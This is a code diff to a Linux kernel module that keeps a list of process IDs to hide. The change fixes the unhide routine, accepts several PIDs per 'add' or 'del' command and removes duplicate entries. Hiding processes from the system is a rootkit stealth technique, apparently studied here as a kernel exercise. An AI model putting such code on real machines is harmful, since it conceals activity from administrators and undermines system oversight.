@@ -2,6 +2,7 @@
 #include <linux/ftrace.h>
 #include <linux/kallsyms.h>
 #include <linux/list.h>
+#include <linux/list_sort.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
 
@@ -117,8 +118,10 @@ static int hide_process(pid_t pid) {
 static int unhide_process(pid_t pid) {
   pid_node_t *proc, *tmp_proc;
   list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
-    list_del(&proc->list_node);
-    kfree(proc);
+    if (proc->id == pid) {
+      list_del(&proc->list_node);
+      kfree(proc);
+    }
   }
   return SUCCESS;
 }
@@ -150,10 +153,20 @@ static ssize_t device_read(struct file *filep, char *buffer, size_t len,
   return *offset;
 }
 
+int list_cmp(void *priv, struct list_head *a, struct list_head *b) {
+  pid_node_t *pa = list_entry(a, typeof(pid_node_t), list_node),
+             *pb = list_entry(b, typeof(pid_node_t), list_node);
+  return pa->id > pb->id;
+}
+
 static ssize_t device_write(struct file *filep, const char *buffer, size_t len,
                             loff_t *offset) {
   long pid;
-  char *message;
+  char *message, *start, *found;
+  int ret, input_mode;
+  enum INPUT_MODE { _ADD, _DEL };
+  pid_node_t *proc, *tmp_proc;
+  void *priv;
 
   char add_message[] = "add", del_message[] = "del";
   if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
@@ -163,17 +176,38 @@ static ssize_t device_write(struct file *filep, const char *buffer, size_t len,
   memset(message, 0, len + 1);
   copy_from_user(message, buffer, len);
   if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
-    kstrtol(message + sizeof(add_message), 10, &pid);
-    hide_process(pid);
+    input_mode = _ADD;
+    start = message + sizeof(add_message);
   } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
-    kstrtol(message + sizeof(del_message), 10, &pid);
-    unhide_process(pid);
+    input_mode = _DEL;
+    start = message + sizeof(del_message);
   } else {
     kfree(message);
     return -EAGAIN;
   }
 
-  *offset = len;
+  while ((found = strsep(&start, " ")) != NULL) {
+    if ((ret = kstrtol(found, 10, &pid)) == 0) {
+      switch (input_mode) {
+      case _ADD:
+        hide_process(pid);
+        break;
+      case _DEL:
+        unhide_process(pid);
+        break;
+      }
+    }
+  }
+
+  /* remove duplicate entries */
+  list_sort(priv, &hidden_proc, &list_cmp);
+  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
+    if (&tmp_proc->list_node != (&hidden_proc) && tmp_proc->id == proc->id) {
+      list_del(&proc->list_node);
+      kfree(proc);
+    }
+  }
+
   kfree(message);
   return len;
 }
